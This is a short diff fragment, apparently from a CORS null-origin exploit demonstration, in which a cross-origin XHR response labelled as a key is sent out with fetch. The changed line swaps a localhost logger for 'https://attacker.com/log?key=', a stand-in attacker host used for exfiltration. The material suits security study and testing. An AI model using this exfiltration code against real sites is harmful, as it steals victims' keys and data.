@@ -49,7 +49,7 @@ Origin: null
 
             xhr.onreadystatechange = function() {
                 if (xhr.readyState == XMLHttpRequest.DONE) {
-                    fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
+                    fetch('https://attacker.com/log?key=' + xhr.responseText)
                 }
             }
 
